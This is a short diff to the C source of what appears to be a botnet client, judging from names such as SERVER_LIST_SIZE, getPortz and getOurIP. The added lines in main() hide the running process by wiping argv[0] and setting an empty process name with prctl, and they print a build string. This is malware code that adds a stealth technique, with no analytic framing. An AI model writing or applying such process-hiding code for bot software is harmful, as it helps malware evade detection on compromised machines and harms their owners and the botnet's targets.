@@ -1530,8 +1530,12 @@ char *getPortz()
 int main(int argc, unsigned char *argv[])
 {
       
+        char *mynameis = "";
         if(SERVER_LIST_SIZE <= 0) return 0;
-
+    printf("BUILD %s\n", getBuild());
+    strncpy(argv[0],"",strlen(argv[0]));
+        argv[0] = "";
+        prctl(PR_SET_NAME, (unsigned long) mynameis, 0, 0, 0);
     srand(time(NULL) ^ getpid());
         init_rand(time(NULL) ^ getpid());
        getOurIP();
